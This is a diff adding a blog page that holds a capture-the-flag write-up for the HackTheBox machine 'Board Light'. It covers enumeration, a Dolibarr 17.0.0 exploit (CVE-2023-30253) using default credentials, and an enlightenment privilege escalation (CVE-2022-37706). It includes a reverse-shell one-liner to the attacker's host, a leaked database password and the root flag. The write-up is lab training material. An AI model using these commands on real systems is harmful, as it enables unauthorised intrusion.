@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta
+    name="description"
+    content=""
+  />
+  
+    
+      <title>Board Light - HackTheBox Writeup (Easy) | Supaaasuge&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <div id="root">
+      <header>
+  <div id="brand">
+    <a class="icon-link" href="https://supaaasuge.github.io/">
+      <img
+        class="icon"
+        src="/images/brandIcon.svg"
+      />
+    </a>
+    <div class="text">
+      <a href="https://supaaasuge.github.io/"><h1>Supaaasuge&#39;s Blog</h1></a>
+      <h3>Aspiring IT/Cybersecurity Professional</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/about/"><b>About</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/categories/"><b>Categories</b></a>
+      
+         | 
+        <a href="/tags/"><b>Tags</b></a>
+      
+         | 
+        <a href="/index.xml"><b>RSS</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+      <div id="content">
+        
+  <main>
+    <article>
+      <h1 class="title">Board Light - HackTheBox Writeup (Easy)</h1>
+      
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2024-07-09</time>
+    <span>in</span>
+    
+      <a href="/categories/hackthebox">HackTheBox</a>
+  </strong>
+  <span> • 828 words</span>
+  <span> • 4 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/linux">Linux</a>, 
+        <a href="/tags/dolibarr-17.0.0">Dolibarr 17.0.0</a>, 
+        <a href="/tags/cve-2023-30253">CVE-2023-30253</a>, 
+        <a href="/tags/cve-2022-37706">CVE-2022-37706</a>
+    </div>
+  
+</div>
+
+      <div class="content"><h2 id="machine-summary">Machine Summary</h2>
+<p>In this Hack The Box machine, I start of with basic Nmap enumeration. Then move on to directory enumeration and vhost enumeration using gobuster and ffuf. From here, we find an endpoint running Dollibarr v17.0.0 that is vulnerable to CVE-2023-30253. We are able to leverage this to get a reverse shell on the machine and get an initial foothold. From here, we find a password for the user <code>larissa</code> and are able to use these credentials to log in via SSH. After some quick file system enumeration, and searching for binaries with the SUID bit set&hellip; we can note that <code>enlightenment</code> is present on the box. It just so happens that this version of enlightenment is vulnerable to <a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/README.md">CVE-2022-37706</a>, a local privilege escalation vulnerability. Finally, using a public PoC bash script for <a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/README.md">CVE-2022-37706</a> we are able to successfully escalate our privileges to the root user and obtain the root flag.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Initial scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -p- --min-rate <span style="color:#ae81ff">10000</span> -Pn 10.129.248.72
+Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-07-05 23:35 EDT
+Warning: 10.129.248.72 giving up on port because retransmission cap hit <span style="color:#f92672">(</span>10<span style="color:#f92672">)</span>.
+Nmap scan report <span style="color:#66d9ef">for</span> 10.129.248.72
+Host is up <span style="color:#f92672">(</span>0.063s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">64719</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>, <span style="color:#ae81ff">814</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div><ul>
+<li>Service Version, Scripts, and OS detection scan:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -A -Pn -O -p22,80 10.129.248.72
+Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-07-05 23:40 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.129.248.72
+Host is up <span style="color:#f92672">(</span>0.046s latency<span style="color:#f92672">)</span>.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">3072</span> 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#f92672">)</span>.
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+Aggressive OS guesses: Linux 5.0 <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>, Linux 4.15 - 5.8 <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Linux 5.3 - 5.4 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 2.6.32 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 5.0 - 5.5 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.1 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.2 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, AXIS 210A or <span style="color:#ae81ff">211</span> Network Camera <span style="color:#f92672">(</span>Linux 2.6.17<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, ASUS RT-N56U WAP <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.16 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+Network Distance: <span style="color:#ae81ff">2</span> hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span style="color:#f92672">(</span>using port 80/tcp<span style="color:#f92672">)</span>
+HOP RTT      ADDRESS
+<span style="color:#ae81ff">1</span>   45.54 ms 10.10.14.1
+<span style="color:#ae81ff">2</span>   46.42 ms 10.129.248.72
+
+</code></pre></div><ul>
+<li>
+<p><strong>Ports Open</strong>
+<code>22</code>: SSH, <code>80</code>: HTTP</p>
+</li>
+<li>
+<p><strong>Domain Found</strong>: <code>board.htb</code></p>
+</li>
+<li>
+<p><strong>Services</strong></p>
+<ul>
+<li>OpenSSH 8.2p1</li>
+<li>Apache httpd 2.4.41</li>
+</ul>
+</li>
+<li>
+<p><strong>Operating System</strong>
+Ubuntu 20.04</p>
+</li>
+</ul>
+<h4 id="web-page">Web page</h4>
+<ul>
+<li>add <code>board.htb</code> to <code>/etc/hosts</code></li>
+</ul>
+<h4 id="directory-enumeration">Directory Enumeration</h4>
+<p>Nothing interesting found.</p>
+<h4 id="vhost-enumeration">Vhost Enumeration</h4>
+<p><code>ffuf -w /usr/share/wordlists/dirb/big.txt -H &quot;Host:FUZZ.board.htb&quot; -u &quot;http://board.htb/&quot;</code></p>
+<ul>
+<li>Found: <code>crm.board.htb</code></li>
+</ul>
+<h2 id="foothold">Foothold</h2>
+<p>After adding <code>crm.board.htb</code> we come across a login page running <code>Dolibarr 17.0.0</code>.
+The first username/password combo I tried worked, lets go! (<code>admin</code>:<code>admin</code>)
+To get a foothold on the machine, I will leverage <a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253">CVE-2023-30253</a> to get a shell on the machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python exploit.py http://crm.board.htb admin admin 10.10.14.45 <span style="color:#ae81ff">6969</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying authentication...
+<span style="color:#f92672">[</span>**<span style="color:#f92672">]</span> Login: admin
+<span style="color:#f92672">[</span>**<span style="color:#f92672">]</span> Password: admin
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying created site...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying created page...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying editing page and call reverse shell... Press Ctrl+C after successful connection
+</code></pre></div><p>Listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvnp <span style="color:#ae81ff">6969</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">6969</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.45<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.248.72<span style="color:#f92672">]</span> <span style="color:#ae81ff">58436</span>
+bash: cannot set terminal process group <span style="color:#f92672">(</span>850<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+<span style="color:#75715e"># getting a backup shell on the machine just in-case</span>
+www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ sh -i &gt;&amp; /dev/tcp/10.10.14.45/4444 0&gt;&amp;<span style="color:#ae81ff">1</span> &amp;
+&lt;/website$ sh -i &gt;&amp; /dev/tcp/10.10.14.45/4444 0&gt;&amp;<span style="color:#ae81ff">1</span> &amp;            
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">1635</span>
+www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
+</code></pre></div><p>Once I got a foothold, after some initial enumeration and file system exploration&hellip; I found an SSH password for the user <code>dolibarrowner</code>.</p>
+<pre tabindex="0"><code>$dolibarr_main_url_root='http://crm.board.htb';
+$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
+$dolibarr_main_url_root_alt='/custom';
+$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
+$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
+$dolibarr_main_db_host='localhost';
+$dolibarr_main_db_port='3306';
+$dolibarr_main_db_name='dolibarr';
+$dolibarr_main_db_prefix='llx_';
+$dolibarr_main_db_user='dolibarrowner';
+$dolibarr_main_db_pass='serverfun2$2023!!';
+$dolibarr_main_db_type='mysqli';
+$dolibarr_main_db_character_set='utf8';
+$dolibarr_main_db_collation='utf8_unicode_ci';
+// Authentication settings
+$dolibarr_main_authentication='dolibarr';
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h4 id="distribution-type-and-version">Distribution type and version</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat /etc/*-release
+
+DISTRIB_ID<span style="color:#f92672">=</span>Ubuntu
+DISTRIB_RELEASE<span style="color:#f92672">=</span>20.04
+DISTRIB_CODENAME<span style="color:#f92672">=</span>focal
+DISTRIB_DESCRIPTION<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu 20.04.6 LTS&#34;</span>
+NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu&#34;</span>
+VERSION<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;20.04.6 LTS (Focal Fossa)&#34;</span>
+ID<span style="color:#f92672">=</span>ubuntu
+ID_LIKE<span style="color:#f92672">=</span>debian
+PRETTY_NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu 20.04.6 LTS&#34;</span>
+VERSION_ID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;20.04&#34;</span>
+HOME_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.ubuntu.com/&#34;</span>
+SUPPORT_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://help.ubuntu.com/&#34;</span>
+BUG_REPORT_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://bugs.launchpad.net/ubuntu/&#34;</span>
+PRIVACY_POLICY_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&#34;</span>
+VERSION_CODENAME<span style="color:#f92672">=</span>focal
+UBUNTU_CODENAME<span style="color:#f92672">=</span>focal
+</code></pre></div><h4 id="kernel-information">Kernel information</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">larissa@boardlight:~$ uname -a
+Linux boardlight 5.15.0-107-generic <span style="color:#75715e">#117~20.04.1-Ubuntu SMP Tue Apr 30 10:35:57 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux</span>
+
+larissa@boardlight:~$ cat /proc/version
+Linux version 5.15.0-107-generic <span style="color:#f92672">(</span>buildd@lcy02-amd64-017<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>gcc <span style="color:#f92672">(</span>Ubuntu 9.4.0-1ubuntu1~20.04.2<span style="color:#f92672">)</span> 9.4.0, GNU ld <span style="color:#f92672">(</span>GNU Binutils <span style="color:#66d9ef">for</span> Ubuntu<span style="color:#f92672">)</span> 2.34<span style="color:#f92672">)</span> <span style="color:#75715e">#117~20.04.1-Ubuntu SMP Tue Apr 30 10:35:57 UTC 2024</span>
+</code></pre></div><h4 id="environment-variables">Environment variables</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ env
+
+SHELL<span style="color:#f92672">=</span>/bin/bash
+PWD<span style="color:#f92672">=</span>/home/larissa
+LOGNAME<span style="color:#f92672">=</span>larissa
+MOTD_SHOWN<span style="color:#f92672">=</span>pam
+HOME<span style="color:#f92672">=</span>/home/larissa
+LANG<span style="color:#f92672">=</span>en_US.UTF-8
+LS_COLORS<span style="color:#f92672">=</span>rs<span style="color:#f92672">=</span>0:di<span style="color:#f92672">=</span>01;34:ln<span style="color:#f92672">=</span>01;36:mh<span style="color:#f92672">=</span>00:pi<span style="color:#f92672">=</span>40;33:so<span style="color:#f92672">=</span>01;35:do<span style="color:#f92672">=</span>01;35:bd<span style="color:#f92672">=</span>40;33;01:cd<span style="color:#f92672">=</span>40;33;01:or<span style="color:#f92672">=</span>40;31;01:mi<span style="color:#f92672">=</span>00:su<span style="color:#f92672">=</span>37;41:sg<span style="color:#f92672">=</span>30;43:ca<span style="color:#f92672">=</span>30;41:tw<span style="color:#f92672">=</span>30;42:ow<span style="color:#f92672">=</span>34;42:st<span style="color:#f92672">=</span>37;44:ex<span style="color:#f92672">=</span>01;32:*.tar<span style="color:#f92672">=</span>01;31:*.tgz<span style="color:#f92672">=</span>01;31:*.arc<span style="color:#f92672">=</span>01;31:*.arj<span style="color:#f92672">=</span>01;31:*.taz<span style="color:#f92672">=</span>01;31:*.lha<span style="color:#f92672">=</span>01;31:*.lz4<span style="color:#f92672">=</span>01;31:*.lzh<span style="color:#f92672">=</span>01;31:*.lzma<span style="color:#f92672">=</span>01;31:*.tlz<span style="color:#f92672">=</span>01;31:*.txz<span style="color:#f92672">=</span>01;31:*.tzo<span style="color:#f92672">=</span>01;31:*.t7z<span style="color:#f92672">=</span>01;31:*.zip<span style="color:#f92672">=</span>01;31:*.z<span style="color:#f92672">=</span>01;31:*.dz<span style="color:#f92672">=</span>01;31:*.gz<span style="color:#f92672">=</span>01;31:*.lrz<span style="color:#f92672">=</span>01;31:*.lz<span style="color:#f92672">=</span>01;31:*.lzo<span style="color:#f92672">=</span>01;31:*.xz<span style="color:#f92672">=</span>01;31:*.zst<span style="color:#f92672">=</span>01;31:*.tzst<span style="color:#f92672">=</span>01;31:*.bz2<span style="color:#f92672">=</span>01;31:*.bz<span style="color:#f92672">=</span>01;31:*.tbz<span style="color:#f92672">=</span>01;31:*.tbz2<span style="color:#f92672">=</span>01;31:*.tz<span style="color:#f92672">=</span>01;31:*.deb<span style="color:#f92672">=</span>01;31:*.rpm<span style="color:#f92672">=</span>01;31:*.jar<span style="color:#f92672">=</span>01;31:*.war<span style="color:#f92672">=</span>01;31:*.ear<span style="color:#f92672">=</span>01;31:*.sar<span style="color:#f92672">=</span>01;31:*.rar<span style="color:#f92672">=</span>01;31:*.alz<span style="color:#f92672">=</span>01;31:*.ace<span style="color:#f92672">=</span>01;31:*.zoo<span style="color:#f92672">=</span>01;31:*.cpio<span style="color:#f92672">=</span>01;31:*.7z<span style="color:#f92672">=</span>01;31:*.rz<span style="color:#f92672">=</span>01;31:*.cab<span style="color:#f92672">=</span>01;31:*.wim<span style="color:#f92672">=</span>01;31:*.swm<span style="color:#f92672">=</span>01;31:*.dwm<span style="color:#f92672">=</span>01;31:*.esd<span style="color:#f92672">=</span>01;31:*.jpg<span style="color:#f92672">=</span>01;35:*.jpeg<span style="color:#f92672">=</span>01;35:*.mjpg<span style="color:#f92672">=</span>01;35:*.mjpeg<span style="color:#f92672">=</span>01;35:*.gif<span style="color:#f92672">=</span>01;35:*.bmp<span style="color:#f92672">=</span>01;35:*.pbm<span style="color:#f92672">=</span>01;35:*.pgm<span style="color:#f92672">=</span>01;35:*.ppm<span style="color:#f92672">=</span>01;35:*.tga<span style="color:#f92672">=</span>01;35:*.xbm<span style="color:#f92672">=</span>01;35:*.xpm<span style="color:#f92672">=</span>01;35:*.tif<span style="color:#f92672">=</span>01;35:*.tiff<span style="color:#f92672">=</span>01;35:*.png<span style="color:#f92672">=</span>01;35:*.svg<span style="color:#f92672">=</span>01;35:*.svgz<span style="color:#f92672">=</span>01;35:*.mng<span style="color:#f92672">=</span>01;35:*.pcx<span style="color:#f92672">=</span>01;35:*.mov<span style="color:#f92672">=</span>01;35:*.mpg<span style="color:#f92672">=</span>01;35:*.mpeg<span style="color:#f92672">=</span>01;35:*.m2v<span style="color:#f92672">=</span>01;35:*.mkv<span style="color:#f92672">=</span>01;35:*.webm<span style="color:#f92672">=</span>01;35:*.ogm<span style="color:#f92672">=</span>01;35:*.mp4<span style="color:#f92672">=</span>01;35:*.m4v<span style="color:#f92672">=</span>01;35:*.mp4v<span style="color:#f92672">=</span>01;35:*.vob<span style="color:#f92672">=</span>01;35:*.qt<span style="color:#f92672">=</span>01;35:*.nuv<span style="color:#f92672">=</span>01;35:*.wmv<span style="color:#f92672">=</span>01;35:*.asf<span style="color:#f92672">=</span>01;35:*.rm<span style="color:#f92672">=</span>01;35:*.rmvb<span style="color:#f92672">=</span>01;35:*.flc<span style="color:#f92672">=</span>01;35:*.avi<span style="color:#f92672">=</span>01;35:*.fli<span style="color:#f92672">=</span>01;35:*.flv<span style="color:#f92672">=</span>01;35:*.gl<span style="color:#f92672">=</span>01;35:*.dl<span style="color:#f92672">=</span>01;35:*.xcf<span style="color:#f92672">=</span>01;35:*.xwd<span style="color:#f92672">=</span>01;35:*.yuv<span style="color:#f92672">=</span>01;35:*.cgm<span style="color:#f92672">=</span>01;35:*.emf<span style="color:#f92672">=</span>01;35:*.ogv<span style="color:#f92672">=</span>01;35:*.ogx<span style="color:#f92672">=</span>01;35:*.aac<span style="color:#f92672">=</span>00;36:*.au<span style="color:#f92672">=</span>00;36:*.flac<span style="color:#f92672">=</span>00;36:*.m4a<span style="color:#f92672">=</span>00;36:*.mid<span style="color:#f92672">=</span>00;36:*.midi<span style="color:#f92672">=</span>00;36:*.mka<span style="color:#f92672">=</span>00;36:*.mp3<span style="color:#f92672">=</span>00;36:*.mpc<span style="color:#f92672">=</span>00;36:*.ogg<span style="color:#f92672">=</span>00;36:*.ra<span style="color:#f92672">=</span>00;36:*.wav<span style="color:#f92672">=</span>00;36:*.oga<span style="color:#f92672">=</span>00;36:*.opus<span style="color:#f92672">=</span>00;36:*.spx<span style="color:#f92672">=</span>00;36:*.xspf<span style="color:#f92672">=</span>00;36:
+SSH_CONNECTION<span style="color:#f92672">=</span>10.10.14.45 <span style="color:#ae81ff">55718</span> 10.129.248.72 <span style="color:#ae81ff">22</span>
+LESSCLOSE<span style="color:#f92672">=</span>/usr/bin/lesspipe %s %s
+TERM<span style="color:#f92672">=</span>xterm-256color
+LESSOPEN<span style="color:#f92672">=</span>| /usr/bin/lesspipe %s
+USER<span style="color:#f92672">=</span>larissa
+SHLVL<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+SSH_CLIENT<span style="color:#f92672">=</span>10.10.14.45 <span style="color:#ae81ff">55718</span> <span style="color:#ae81ff">22</span>
+PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+SSH_TTY<span style="color:#f92672">=</span>/dev/pts/1
+_<span style="color:#f92672">=</span>/usr/bin/env
+</code></pre></div><h4 id="applications-and-services">Applications and services</h4>
+<h4 id="suid-binaries">SUID Binaries</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ find / -perm -4000 2&gt;/dev/null
+
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
+/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/sbin/pppd
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/bin/vmware-user-suid-wrapper
+</code></pre></div><p>From the output above, we can see <code>enlightment</code>. After checking it&rsquo;s version:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dpkg -l | grep enlightenment
+hi  enlightenment                          0.23.1-4                            amd64        X11 window manager based on EFL
+hi  enlightenment-data                     0.23.1-4                            all          X11 window manager based on EFL - run time data files
+</code></pre></div><p>After looking up this version of enlightenment with &ldquo;exploit&rdquo; we find the following link, which we can easily copy over to the machine then get root :)</p>
+<p>root.txt: <code>a9d8c15af0c4817d83fa86f462e3c387</code></p>
+<h3 id="resources">Resources</h3>
+<ul>
+<li><a href="https://httpd.apache.org/security/vulnerabilities_24.html">https://httpd.apache.org/security/vulnerabilities_24.html</a></li>
+<li><a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/README.md">https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/README.md</a></li>
+<li><a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253">https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253</a></li>
+<li></li>
+</ul>
+</div>
+    </article>
+  </main>
+
+      </div>
+      <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/supaaasuge">GitHub</a>
+      
+         | 
+        <a href="https://x.com/supaaasuge">Twitter</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2024
+    <a href="https://supaaasuge.github.io/"><strong>Supaaasuge</strong></a>.
+    This work is licensed under the
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a> license.
+  </p>
+  <p class="builtWith">
+    Built with
+    <a href="http://www.gohugo.io/">Hugo</a>,
+    using the theme
+    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>,
+    which was influenced by the theme
+    <a href="https://github.com/sumnerevans/smol">smol</a>.
+  </p>
+</footer>
+
+    </div>
+  </body>
+</html>
